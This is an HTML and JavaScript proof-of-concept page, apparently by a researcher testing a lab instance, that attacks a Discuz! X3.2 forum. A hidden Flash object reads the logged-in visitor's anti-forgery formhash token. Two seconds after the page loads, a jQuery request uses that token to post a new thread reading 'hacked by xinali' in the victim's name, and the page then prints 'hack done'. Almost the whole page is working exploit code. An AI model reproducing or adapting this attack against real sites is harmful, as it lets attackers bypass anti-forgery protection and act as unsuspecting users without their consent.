<!DOCTYPE html>
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <script src="js/jquery.js"></script>
</head>
<body>

<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" id="Formhash">
    <param name="movie" value="Formhash.swf"/>
    <param name="allowScriptAccess" value="always"/>
    <embed src="Formhash.swf" name="Formhash" hidden="hidden" allowScriptAccess="always">
    </embed>
</object>

</body>
</html>

<script>

    var formhash = '';

    function swfobj(objname) {
        if (navigator.appName.indexOf('Microsoft') != -1) {
            return window[objname];
        }
        else {
            return document[objname];
        }
    }

    function call_ajax() {
        var url = 'http://192.168.1.106/discuz_x3.2/forum.php?mod=post&action=newthread&fid=2&topicsubmit=yes&infloat=yes&handlekey=fastnewpost&inajax=1';
        var post_data = {
            'subject':'ajax request',
            'message':'hacked by xinali',
            'formhash':formhash,
            'usesig':1,
            'posttime':'1449404146'
            };
        $.ajax({
            url:url,
            data:post_data,
            type:'html',
            method:'post'
        })
            .done(function(data) {
                document.write('hack done');
//                document.write(data);
            })
            .fail(function() {
                console.log('error');
            })
    }

    setTimeout(function() {
        formhash = swfobj('Formhash').get_formhash_as('default');
        call_ajax();
    }, 2000);

</script>

<?php
//$domain = $_GET['domain'];
?>


